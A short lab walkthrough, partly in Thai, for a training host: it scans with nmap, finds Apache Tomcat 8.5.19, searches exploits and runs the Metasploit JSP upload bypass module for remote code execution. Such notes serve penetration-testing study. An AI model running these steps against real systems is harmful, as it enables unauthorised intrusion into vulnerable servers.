`nmap --top-ports 65536 demo.ine.local -sV`
8080/tcp  open  http   Apache Tomcat 8.5.19

พยายามสนใจอันที่มีเลข Version

`searchsploit apache tomcat`
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                  | jsp/webapps/42966.py

focus remote code execution เพราะเป็นช่องโหว่ที่รุนแรง

`msfconsole -q`
`search tomcat jsp upload`
 exploit/multi/http/tomcat_jsp_upload_bypass

 ` use exploit/multi/http/tomcat_jsp_upload_bypass `
 `set RHOSTS demo.ine.local`
 `exploit`